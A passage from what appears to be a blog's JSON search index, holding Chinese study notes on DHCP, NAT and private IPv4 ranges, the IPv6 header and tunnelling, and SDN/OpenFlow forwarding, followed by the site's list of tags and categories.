客服端将到达的offer进行选择, 回显该提议的参数. DHCP ACK: 服务端确认该消息, 交互完成 书说DHCP的缺点是每连接到一个新的子网都会得到一个新的IP地址, 当在子网之间移动无法维持远程应用的TCP连接, 不是很理解, 子网之间代表不同的子网, 子网不同IP还能相同? 网上找的缺点还有点像样, 如DHCP服务器无法知道其他DHCP服务器租出去的地址, 不能发现非DHCP使用的IP地址 网络地址转换NATIPv4总共就40亿多地址, 现在每个人都不只一个智能设备, 加上智能家居, 导致了IP的极度稀缺, 于是有了NATNetwork Address Translation这个暂时策略 专有名词 公网IP: 通过ISP等途径获得的全球统一可寻址的地址 私有IP: 内部地址, IANA保留了三类私有地址RFC 1918 10.0.0.0 - 10.255.255.255 (10/8) 172.16.0.0 - 172.31.255.255 (172.16/12) 192.168.0.0 - 192.168.255.255 (192.168/16) 详细分类 block >folded1234567891011121314151617181920212223Address Block Name RFC 0.0.0.0/8 &quot;This host on this network&quot; [RFC1122], section 3.2.1.310.0.0.0/8 Private-Use [RFC1918] 100.64.0.0/10 Shared Address Space [RFC6598] 127.0.0.0/8 Loopback [RFC1122], section 3.2.1.3169.254.0.0/16 Link Local [RFC3927] 172.16.0.0/12 Private-Use [RFC1918] 192.0.0.0/24[2] IETF Protocol Assignments [RFC6890], section 2.1 192.0.0.0/29 IPv4 Service Continuity Prefix [RFC7335] 192.0.0.8/32 IPv4 dummy address [RFC7600] 192.0.0.9/32 Port Control Protocol Anycast [RFC-ietf-pcp-anycast-08] 192.0.0.170/32, 192.0.0.171/32 NAT64/DNS64 Discovery [RFC7050], section 2.2 192.0.2.0/24 Documentation (TEST-NET-1) [RFC5737] 192.31.196.0/24 AS112-v4 [RFC7535] 192.52.193.0/24 AMT [RFC7450] 192.88.99.0/24 Deprecated (6to4 Relay Anycast) [RFC7526] 192.168.0.0/16 Private-Use [RFC1918] 192.175.48.0/24 Direct Delegation AS112 Service [RFC7534] 198.18.0.0/15 Benchmarking [RFC2544] 198.51.100.0/24 Documentation (TEST-NET-2) [RFC5737] 203.0.113.0/24 Documentation (TEST-NET-3) [RFC5737] 240.0.0.0/4 Reserved [RFC1112], section 4 255.255.255.255/32 Limited Broadcast [RFC919], section 7 外网IP: 相对私有IP来说, 外网IP可能是私有IP, 公网IP LAN: 局域网接口, 接上后分配私有IP WAN: 这个接口可以与运营商联系, 这并不代表是公网IP NAT技术原理NAT路由器通过WAN口连接一个可以与外界联系的IP地址(外网IP), 通过许多LAN口连接局域网的设备, 并分配内网地址. 当内网需要请求外网的的数据时, 把请求数据发给NAT路由器, NAT路由器会替换该数据的内网IP成外网IP, 使用现存端口替换原有端口, 将替换过程记录到NAT转发表, 数据到达NAT路由器时根据转发表发送给内网设备 NAT路由器会运行DHCP服务器给内网设备提供IP地址 优点: 稍微解决了IP不够用的问题 缺点: 端口是寻找进程的, 在服务器上, NAT会导致服务端口失效, 如P2P, 现在的解决方法是NAT穿越 关于网络安全 攻击者通过向IP发送恶意数据包来对主机进行攻击, 还可以进行ping扫描和端口扫描. 防火墙可以 端口扫描和根据IP来拦截数据包. IDS(intrusion detection systems)会对数据包进行全身扫描, 还会对攻击的数据包签名, 可以保护主机免受已知攻击 IPv6数据报格式随着时间的推移, IPv4逐渐用尽, 根本的解决方法是升级IP协议的版本, 让它有更多的地址可以分配. 字段解读 version(4bit)：版本, IPv4是４, IPv6是6 Traffic class(8bit): 同IPv4的TOS, 可以为数据报设置优先级 Flow lable(20bit): 流标签, 标识数据流 Payload length(16bit): 有效负载的长度, 代表数据头后面的数据报字节数 Next header(8bit): 标识传递的上层协议 Hop limit(8bit): 代表可以经过(跳)路由的次数, 每经过一个路由则-1, 到0则被丢弃 src&amp;Dst address: 128bit的地址 查阅rfc4921 IPv6的表示形式: 8个16bit ABCD:EF01:2345:6789:ABCD:EF01:2345:6789 2001:DB8:0:0:8:800:200C:417A 省略0 2001:DB8:0:0:8:800:200C:417A 2001:DB8::8:800:200C:417A Data: 传递到目的主机网络层的上层 相对比IPv4, IPv6少了碎片重组, 头部校验和, 选项. 如果数据报在路由器中过大, 则路由器会丢弃这个数据报, 并反馈给发送方, 发送方会调小数据报然后重新发送 因为链路层+传输层都有校验, 而且每次TTL都会变化, IPv4的校验和都会重新计算, 比较耗资源, 所以IPv6觉得冗余删除了校验 选项在报头不存在了, 但Next header可以指向它, 删除它主要是为了IPv6精简的40字节报头. 将IPv4升级为IPv6虽然IPv6向下兼容IPv4, 但现有的IPv4的系统并不支持IPv6, 不可能停用全球所有的支持IPv4的系统来升级IPv6 隧道技术 在两台IPv6的设备之间如果有IPv4的设备, 则会将IPv6整段报文放进IPv4的有效负载段(标识41代表IPv6), 到达目的地提取该IPv6数据段, 中间的IPv4设备就叫隧道 4.4-通用转发和SDN 数据包是基于IP发送的, 然IP是可以在路途中被修改的, 这些设备叫中间盒 以前介绍的转发是基于目标的转发, 根据查找目的IP(匹配), 然后将数据包转发给合适的端口(操作). 通用转发代表更宽广的匹配+操作, 匹配会在不同的层中进行, 操作可以将数据包转发到一个或者多个端口; 执行的设备被称为分组交换机, 区别于链路层的交换机和网络层的路由器. OpenFlow(这是一个标准)将匹配和启动转发的条目称为flow table(流表), 特点是 一组和输入数据包可以匹配的标头字段, 采用硬件匹配(TCAM), 匹配则转发, 否则丢弃或交给远程控制 随数据包和流表条目更新的计数器, 可以记录匹配数据包的数量和流表更新时间 匹配的动作, 有转发到指定端口, 丢弃, 复制到其他端口, 重写标头字段 Match(匹配字段) 详细的Openflow协议参考 OpenFlow协议初探——OpenFLow中的流和流表 具体的action有: 跨多个输出接口(负载均衡)、重写报头(NAT), 阻塞/丢弃数据包(防火墙).","link":"/Networking/Top-Down-Note/Data-Plane.html"}],"tags":[{"name":"zeal","slug":"zeal","link":"/tags/zeal/"},{"name":"文档","slug":"文档","link":"/tags/%E6%96%87%E6%A1%A3/"},{"name":"驾照","slug":"驾照","link":"/tags/%E9%A9%BE%E7%85%A7/"},{"name":"MBR","slug":"MBR","link":"/tags/MBR/"},{"name":"GPT","slug":"GPT","link":"/tags/GPT/"},{"name":"GNU","slug":"GNU","link":"/tags/GNU/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"bash","slug":"bash","link":"/tags/bash/"},{"name":"正则表达式","slug":"正则表达式","link":"/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"管理磁盘","slug":"管理磁盘","link":"/tags/%E7%AE%A1%E7%90%86%E7%A3%81%E7%9B%98/"},{"name":"xfs","slug":"xfs","link":"/tags/xfs/"},{"name":"RAID","slug":"RAID","link":"/tags/RAID/"},{"name":"LVM","slug":"LVM","link":"/tags/LVM/"},{"name":"热键","slug":"热键","link":"/tags/%E7%83%AD%E9%94%AE/"},{"name":"nano","slug":"nano","link":"/tags/nano/"},{"name":"文件","slug":"文件","link":"/tags/%E6%96%87%E4%BB%B6/"},{"name":"链接","slug":"链接","link":"/tags/%E9%93%BE%E6%8E%A5/"},{"name":"权限","slug":"权限","link":"/tags/%E6%9D%83%E9%99%90/"},{"name":"环境变量","slug":"环境变量","link":"/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"name":"文件系统","slug":"文件系统","link":"/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"挂载","slug":"挂载","link":"/tags/%E6%8C%82%E8%BD%BD/"},{"name":"swap","slug":"swap","link":"/tags/swap/"},{"name":"分区","slug":"分区","link":"/tags/%E5%88%86%E5%8C%BA/"},{"name":"压缩","slug":"压缩","link":"/tags/%E5%8E%8B%E7%BC%A9/"},{"name":"backups","slug":"backups","link":"/tags/backups/"},{"name":"xfsdump","slug":"xfsdump","link":"/tags/xfsdump/"},{"name":"服务器","slug":"服务器","link":"/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"进程","slug":"进程","link":"/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"程序","slug":"程序","link":"/tags/%E7%A8%8B%E5%BA%8F/"},{"name":"剪辑","slug":"剪辑","link":"/tags/%E5%89%AA%E8%BE%91/"},{"name":"question","slug":"question","link":"/tags/question/"},{"name":"CPU","slug":"CPU","link":"/tags/CPU/"},{"name":"内存","slug":"内存","link":"/tags/%E5%86%85%E5%AD%98/"},{"name":"接口","slug":"接口","link":"/tags/%E6%8E%A5%E5%8F%A3/"},{"name":"硬盘","slug":"硬盘","link":"/tags/%E7%A1%AC%E7%9B%98/"},{"name":"汇编","slug":"汇编","link":"/tags/%E6%B1%87%E7%BC%96/"},{"name":"ALU","slug":"ALU","link":"/tags/ALU/"},{"name":"寄存器","slug":"寄存器","link":"/tags/%E5%AF%84%E5%AD%98%E5%99%A8/"},{"name":"英语","slug":"英语","link":"/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"名词","slug":"名词","link":"/tags/%E5%90%8D%E8%AF%8D/"},{"name":"语法","slug":"语法","link":"/tags/%E8%AF%AD%E6%B3%95/"},{"name":"口语","slug":"口语","link":"/tags/%E5%8F%A3%E8%AF%AD/"},{"name":"美式","slug":"美式","link":"/tags/%E7%BE%8E%E5%BC%8F/"},{"name":"CSS3","slug":"CSS3","link":"/tags/CSS3/"},{"name":"背景","slug":"背景","link":"/tags/%E8%83%8C%E6%99%AF/"},{"name":"渐变","slug":"渐变","link":"/tags/%E6%B8%90%E5%8F%98/"},{"name":"过渡","slug":"过渡","link":"/tags/%E8%BF%87%E6%B8%A1/"},{"name":"less","slug":"less","link":"/tags/less/"},{"name":"像素","slug":"像素","link":"/tags/%E5%83%8F%E7%B4%A0/"},{"name":"视口","slug":"视口","link":"/tags/%E8%A7%86%E5%8F%A3/"},{"name":"响应式","slug":"响应式","link":"/tags/%E5%93%8D%E5%BA%94%E5%BC%8F/"},{"name":"HTML5","slug":"HTML5","link":"/tags/HTML5/"},{"name":"CSS","slug":"CSS","link":"/tags/CSS/"},{"name":"表格","slug":"表格","link":"/tags/%E8%A1%A8%E6%A0%BC/"},{"name":"表单","slug":"表单","link":"/tags/%E8%A1%A8%E5%8D%95/"},{"name":"框架","slug":"框架","link":"/tags/%E6%A1%86%E6%9E%B6/"},{"name":"JSON","slug":"JSON","link":"/tags/JSON/"},{"name":"事件","slug":"事件","link":"/tags/%E4%BA%8B%E4%BB%B6/"},{"name":"map","slug":"map","link":"/tags/map/"},{"name":"reduce","slug":"reduce","link":"/tags/reduce/"},{"name":"闭包","slug":"闭包","link":"/tags/%E9%97%AD%E5%8C%85/"},{"name":"生成器","slug":"生成器","link":"/tags/%E7%94%9F%E6%88%90%E5%99%A8/"},{"name":"装饰器","slug":"装饰器","link":"/tags/%E8%A3%85%E9%A5%B0%E5%99%A8/"},{"name":"构造函数","slug":"构造函数","link":"/tags/%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/"},{"name":"异步","slug":"异步","link":"/tags/%E5%BC%82%E6%AD%A5/"},{"name":"DOM","slug":"DOM","link":"/tags/DOM/"},{"name":"继承","slug":"继承","link":"/tags/%E7%BB%A7%E6%89%BF/"},{"name":"原型","slug":"原型","link":"/tags/%E5%8E%9F%E5%9E%8B/"},{"name":"DCE","slug":"DCE","link":"/tags/DCE/"},{"name":"DTE","slug":"DTE","link":"/tags/DTE/"},{"name":"DHCP","slug":"DHCP","link":"/tags/DHCP/"},{"name":"RIP","slug":"RIP","link":"/tags/RIP/"},{"name":"STP","slug":"STP","link":"/tags/STP/"},{"name":"RSTP","slug":"RSTP","link":"/tags/RSTP/"},{"name":"帧","slug":"帧","link":"/tags/%E5%B8%A7/"},{"name":"差错控制","slug":"差错控制","link":"/tags/%E5%B7%AE%E9%94%99%E6%8E%A7%E5%88%B6/"},{"name":"奇偶校验码","slug":"奇偶校验码","link":"/tags/%E5%A5%87%E5%81%B6%E6%A0%A1%E9%AA%8C%E7%A0%81/"},{"name":"带宽","slug":"带宽","link":"/tags/%E5%B8%A6%E5%AE%BD/"},{"name":"时延","slug":"时延","link":"/tags/%E6%97%B6%E5%BB%B6/"},{"name":"多路复用","slug":"多路复用","link":"/tags/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"},{"name":"数据传输","slug":"数据传输","link":"/tags/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/"},{"name":"OSI","slug":"OSI","link":"/tags/OSI/"},{"name":"TCP&#x2F;IP","slug":"TCP-IP","link":"/tags/TCP-IP/"},{"name":"PAN","slug":"PAN","link":"/tags/PAN/"},{"name":"LAN","slug":"LAN","link":"/tags/LAN/"},{"name":"MAN","slug":"MAN","link":"/tags/MAN/"},{"name":"协议","slug":"协议","link":"/tags/%E5%8D%8F%E8%AE%AE/"},{"name":"服务","slug":"服务","link":"/tags/%E6%9C%8D%E5%8A%A1/"},{"name":"分组","slug":"分组","link":"/tags/%E5%88%86%E7%BB%84/"},{"name":"NASK","slug":"NASK","link":"/tags/NASK/"},{"name":"按位","slug":"按位","link":"/tags/%E6%8C%89%E4%BD%8D/"},{"name":"移位","slug":"移位","link":"/tags/%E7%A7%BB%E4%BD%8D/"},{"name":"链表","slug":"链表","link":"/tags/%E9%93%BE%E8%A1%A8/"},{"name":"集合","slug":"集合","link":"/tags/%E9%9B%86%E5%90%88/"},{"name":"JDk","slug":"JDk","link":"/tags/JDk/"},{"name":"数组","slug":"数组","link":"/tags/%E6%95%B0%E7%BB%84/"},{"name":"方法","slug":"方法","link":"/tags/%E6%96%B9%E6%B3%95/"},{"name":"函数","slug":"函数","link":"/tags/%E5%87%BD%E6%95%B0/"},{"name":"构造方法","slug":"构造方法","link":"/tags/%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/"},{"name":"封装","slug":"封装","link":"/tags/%E5%B0%81%E8%A3%85/"},{"name":"方法重载","slug":"方法重载","link":"/tags/%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BD/"},{"name":"方法重写","slug":"方法重写","link":"/tags/%E6%96%B9%E6%B3%95%E9%87%8D%E5%86%99/"},{"name":"内部类","slug":"内部类","link":"/tags/%E5%86%85%E9%83%A8%E7%B1%BB/"},{"name":"多态","slug":"多态","link":"/tags/%E5%A4%9A%E6%80%81/"},{"name":"eclipse","slug":"eclipse","link":"/tags/eclipse/"},{"name":"随机数","slug":"随机数","link":"/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0/"},{"name":"包装类","slug":"包装类","link":"/tags/%E5%8C%85%E8%A3%85%E7%B1%BB/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"IO流","slug":"IO流","link":"/tags/IO%E6%B5%81/"},{"name":"字典","slug":"字典","link":"/tags/%E5%AD%97%E5%85%B8/"},{"name":"异常处理","slug":"异常处理","link":"/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"name":"模块","slug":"模块","link":"/tags/%E6%A8%A1%E5%9D%97/"},{"name":"pythonic","slug":"pythonic","link":"/tags/pythonic/"},{"name":"Termux","slug":"Termux","link":"/tags/Termux/"},{"name":"adb","slug":"adb","link":"/tags/adb/"},{"name":"CDN","slug":"CDN","link":"/tags/CDN/"},{"name":"jsDeliver","slug":"jsDeliver","link":"/tags/jsDeliver/"},{"name":"Github","slug":"Github","link":"/tags/Github/"},{"name":"gitalk","slug":"gitalk","link":"/tags/gitalk/"},{"name":"github","slug":"github","link":"/tags/github/"},{"name":"Travis CI","slug":"Travis-CI","link":"/tags/Travis-CI/"},{"name":"icraus","slug":"icraus","link":"/tags/icraus/"},{"name":"amazing","slug":"amazing","link":"/tags/amazing/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"美化","slug":"美化","link":"/tags/%E7%BE%8E%E5%8C%96/"},{"name":"系统优化","slug":"系统优化","link":"/tags/%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/"},{"name":"装系统","slug":"装系统","link":"/tags/%E8%A3%85%E7%B3%BB%E7%BB%9F/"},{"name":"manjaro","slug":"manjaro","link":"/tags/manjaro/"},{"name":"virtualbox","slug":"virtualbox","link":"/tags/virtualbox/"},{"name":"虚拟机","slug":"虚拟机","link":"/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"KDE","slug":"KDE","link":"/tags/KDE/"},{"name":"备份","slug":"备份","link":"/tags/%E5%A4%87%E4%BB%BD/"},{"name":"esp","slug":"esp","link":"/tags/esp/"},{"name":"boot","slug":"boot","link":"/tags/boot/"},{"name":"双系统","slug":"双系统","link":"/tags/%E5%8F%8C%E7%B3%BB%E7%BB%9F/"},{"name":"unzip,unar","slug":"unzip-unar","link":"/tags/unzip-unar/"},{"name":"钓鱼","slug":"钓鱼","link":"/tags/%E9%92%93%E9%B1%BC/"},{"name":"wifi","slug":"wifi","link":"/tags/wifi/"},{"name":"wifiphisher","slug":"wifiphisher","link":"/tags/wifiphisher/"},{"name":"wol","slug":"wol","link":"/tags/wol/"},{"name":"archlinux","slug":"archlinux","link":"/tags/archlinux/"},{"name":"TCP","slug":"TCP","link":"/tags/TCP/"},{"name":"UDP","slug":"UDP","link":"/tags/UDP/"},{"name":"wireshark","slug":"wireshark","link":"/tags/wireshark/"},{"name":"aircrack-ng","slug":"aircrack-ng","link":"/tags/aircrack-ng/"},{"name":"webshell","slug":"webshell","link":"/tags/webshell/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"技能大赛-信息安全","slug":"技能大赛-信息安全","link":"/tags/%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"CS6200-28X-EI","slug":"CS6200-28X-EI","link":"/tags/CS6200-28X-EI/"},{"name":"DCFW-1800E-N3002","slug":"DCFW-1800E-N3002","link":"/tags/DCFW-1800E-N3002/"},{"name":"IPsec","slug":"IPsec","link":"/tags/IPsec/"},{"name":"SSL","slug":"SSL","link":"/tags/SSL/"},{"name":"L2TP","slug":"L2TP","link":"/tags/L2TP/"},{"name":"inode","slug":"inode","link":"/tags/inode/"},{"name":"ext2","slug":"ext2","link":"/tags/ext2/"},{"name":"ext4","slug":"ext4","link":"/tags/ext4/"},{"name":"vi","slug":"vi","link":"/tags/vi/"},{"name":"vim","slug":"vim","link":"/tags/vim/"},{"name":"IP","slug":"IP","link":"/tags/IP/"},{"name":"SDN","slug":"SDN","link":"/tags/SDN/"}],"categories":[{"name":"数据库","slug":"数据库","link":"/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"前端","slug":"前端","link":"/categories/%E5%89%8D%E7%AB%AF/"},{"name":"生活","slug":"生活","link":"/categories/%E7%94%9F%E6%B4%BB/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"shell","slug":"Linux/shell","link":"/categories/Linux/shell/"},{"name":"工具","slug":"Linux/工具","link":"/categories/Linux/%E5%B7%A5%E5%85%B7/"},{"name":"adobe","slug":"adobe","link":"/categories/adobe/"},{"name":"计算机内部","slug":"计算机内部","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E9%83%A8/"},{"name":"开发工具","slug":"开发工具","link":"/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"},{"name":"英语","slug":"英语","link":"/categories/%E8%8B%B1%E8%AF%AD/"},{"name":"pr","slug":"adobe/pr","link":"/categories/adobe/pr/"},{"name":"CSS","slug":"前端/CSS","link":"/categories/%E5%89%8D%E7%AB%AF/CSS/"},{"name":"git","slug":"开发工具/git","link":"/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/git/"},{"name":"语法","slug":"英语/语法","link":"/categories/%E8%8B%B1%E8%AF%AD/%E8%AF%AD%E6%B3%95/"},{"name":"HTML","slug":"前端/HTML","link":"/categories/%E5%89%8D%E7%AB%AF/HTML/"},{"name":"JavaScript","slug":"前端/JavaScript","link":"/categories/%E5%89%8D%E7%AB%AF/JavaScript/"},{"name":"VUE","slug":"前端/VUE","link":"/categories/%E5%89%8D%E7%AB%AF/VUE/"},{"name":"网络设备配置","slug":"网络设备配置","link":"/categories/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AE/"},{"name":"计算机网络","slug":"计算机网络","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"操作系统","slug":"操作系统","link":"/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"口语","slug":"英语/口语","link":"/categories/%E8%8B%B1%E8%AF%AD/%E5%8F%A3%E8%AF%AD/"},{"name":"C","slug":"C","link":"/categories/C/"},{"name":"Java","slug":"Java","link":"/categories/Java/"},{"name":"PHP","slug":"PHP","link":"/categories/PHP/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"个人技术心得","slug":"个人技术心得","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/"},{"name":"OOP","slug":"前端/JavaScript/OOP","link":"/categories/%E5%89%8D%E7%AB%AF/JavaScript/OOP/"},{"name":"Cisco","slug":"网络设备配置/Cisco","link":"/categories/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AE/Cisco/"},{"name":"神州","slug":"网络设备配置/神州","link":"/categories/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AE/%E7%A5%9E%E5%B7%9E/"},{"name":"NOTE","slug":"计算机网络/NOTE","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/NOTE/"},{"name":"Top-Down-Note","slug":"计算机网络/Top-Down-Note","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Top-Down-Note/"},{"name":"自制OS","slug":"操作系统/自制OS","link":"/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%87%AA%E5%88%B6OS/"},{"name":"Android","slug":"个人技术心得/Android","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/Android/"},{"name":"博客","slug":"个人技术心得/博客","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/%E5%8D%9A%E5%AE%A2/"},{"name":"Linux","slug":"个人技术心得/Linux","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/Linux/"},{"name":"网络","slug":"个人技术心得/网络","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/%E7%BD%91%E7%BB%9C/"},{"name":"渗透","slug":"个人技术心得/渗透","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/%E6%B8%97%E9%80%8F/"},{"name":"工具","slug":"个人技术心得/博客/工具","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/%E5%8D%9A%E5%AE%A2/%E5%B7%A5%E5%85%B7/"},{"name":"主题","slug":"个人技术心得/博客/主题","link":"/categories/%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/%E5%8D%9A%E5%AE%A2/%E4%B8%BB%E9%A2%98/"}]}